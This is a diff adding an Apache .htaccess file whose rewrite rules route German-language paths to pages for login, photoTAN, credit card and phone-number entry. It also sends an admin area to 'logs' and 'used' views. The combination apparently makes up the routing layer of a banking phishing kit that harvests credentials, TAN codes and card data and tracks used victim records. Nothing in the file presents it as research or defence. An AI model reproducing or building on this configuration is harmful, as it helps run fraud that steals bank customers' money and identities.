@@ -1,0 +1,41 @@
+RewriteEngine On
+# Rewrite "/anyPath" to "/anyPath.php"
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME}.php -f
+RewriteRule ^(.+)$ $1.php [NC,L]
+
+# Skip rewrite if the request is for a real file or directory
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+
+# Ensure mod_rewrite is enabled and working
+RewriteCond %{HTTP_HOST} ^(.+)$
+
+# Redirect from root to /einloggen/
+# RewriteRule ^$ /einloggen/ [R=301,L]
+
+# Rules for routing
+# Modified rules for paths
+RewriteRule ^einloggen/?.*$ Login.php [NC,L]
+RewriteRule ^information/?.*$ Phototan.php [NC,L]
+RewriteRule ^kreditkarte/?.*$ Kreditkarte.php [NC,L]
+RewriteRule ^identifizierung/?.*$ Telefonummer.php [NC,L]
+
+
+# Remove trailing slash for /admin/logs/ and /admin/used/
+RewriteCond %{REQUEST_URI} ^/admin/(logs|used)/$
+RewriteRule ^admin/(logs|used)/$ /admin/$1 [R=301,L]
+
+# Redirect from admin/ to admin/logs
+RewriteRule ^admin/?$ /admin/logs [R=301,L]
+
+# Exclude URLs that start with admin/API/
+RewriteCond %{REQUEST_URI} !^/admin/Api/.*$
+RewriteCond %{REQUEST_URI} !^/admin/logout
+
+# Redirect /admin/* to admin/index.php
+RewriteRule ^admin/?.*$ admin/index.php [L]
+
+
+
+
